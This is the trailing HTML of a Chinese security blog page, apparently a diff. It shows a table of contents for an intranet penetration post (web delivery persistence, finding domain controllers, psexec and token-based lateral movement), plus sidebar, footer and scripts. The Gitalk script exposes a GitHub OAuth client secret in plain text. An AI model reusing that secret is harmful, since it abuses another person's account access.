class="nav-text">自动化脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建一个-web-Delivery-服务自启"><span class="nav-number">7.8.</span> <span class="nav-text">创建一个 web Delivery 服务自启</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内网信息收集"><span class="nav-number">8.</span> <span class="nav-text">内网信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#本机信息收集"><span class="nav-number">8.1.</span> <span class="nav-text">本机信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其它主机信息收集"><span class="nav-number">8.2.</span> <span class="nav-text">其它主机信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#找域控"><span class="nav-number">8.2.1.</span> <span class="nav-text">找域控</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#横向移动"><span class="nav-number">9.</span> <span class="nav-text">横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用CS的-psexec"><span class="nav-number">9.1.</span> <span class="nav-text">利用CS的 psexec</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#利用进程的token"><span class="nav-number">9.1.1.</span> <span class="nav-text">利用进程的token</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-系统漏洞"><span class="nav-number">9.2.</span> <span class="nav-text">利用 系统漏洞</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23li6cOHoOwCcszzi9',
+      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
+      repo        : 'mayi077.github.io',
+      owner       : 'mayi077',
+      admin       : ['mayi077'],
+      id          : '106f8d1431f345ae6550466eccdd67fe',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
